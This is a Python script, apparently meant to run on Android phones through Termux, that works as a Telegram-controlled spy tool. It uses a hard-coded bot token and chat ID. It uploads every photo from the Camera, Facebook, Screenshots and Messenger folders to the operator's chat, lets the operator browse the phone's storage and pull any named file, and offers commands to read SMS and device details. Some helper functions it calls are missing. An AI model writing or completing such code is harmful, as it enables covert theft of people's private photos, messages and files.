import os
import requests
import json
import subprocess

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Global variable to store current folder path
current_folder = "/storage/emulated/0/"

# List of photo locations
photo_locations = [
    "/data/data/com.termux/files/home/storage/shared/DCIM/Camera",
    "/data/data/com.termux/files/home/storage/shared/DCIM/Facebook",
    "/data/data/com.termux/files/home/storage/shared/Pictures/Screenshots",
    "/data/data/com.termux/files/home/storage/shared/Pictures/Messenger"
]

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to download a specific file
def download_file(file_name):
    try:
        file_path = os.path.join(current_folder, file_name)
        
        if os.path.isfile(file_path):
            # Send the file to Telegram
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return f"File `{file_name}` sent successfully!"
            else:
                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
        else:
            return f"File `{file_name}` does not exist or is not a valid file."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Function to send all PNG and JPG photos from specified locations
def send_photos_to_telegram():
    try:
        for location in photo_locations:
            if os.path.isdir(location):
                for file_name in os.listdir(location):
                    if file_name.lower().endswith(('.png', '.jpg', '.jpeg')):
                        file_path = os.path.join(location, file_name)
                        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                        files = {'document': open(file_path, 'rb')}
                        data = {"chat_id": CHAT_ID}
                        response = requests.post(url, files=files, data=data)
                        
                        if response.status_code == 200:
                            print(f"Photo `{file_name}` sent successfully!")
                        else:
                            print(f"Failed to send photo `{file_name}`. Status code: {response.status_code}, Response: {response.text}")
            else:
                print(f"Location `{location}` does not exist.")
        send_to_telegram("All photos sent successfully.")
    except Exception as e:
        send_to_telegram(f"Error sending photos: {str(e)}")

# Telegram bot logic to handle file, folder, SMS, and device requests
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message == "/sms":
                sms_messages = get_sms()
                send_to_telegram(sms_messages)
            
            elif message == "/device":
                device_info = get_device_info()
                send_to_telegram(device_info)

            elif message == "/sdcard":
                global current_folder
                current_folder = "/storage/emulated/0/"
                send_to_telegram(f"Navigating to SD card: `{current_folder}`")
                handle_folder_navigation("")  # Show initial folder contents

            elif message == "/dwphoto":
                send_photos_to_telegram()

            else:
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Example of how to handle incoming Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Start listening for updates
    listen_for_updates()
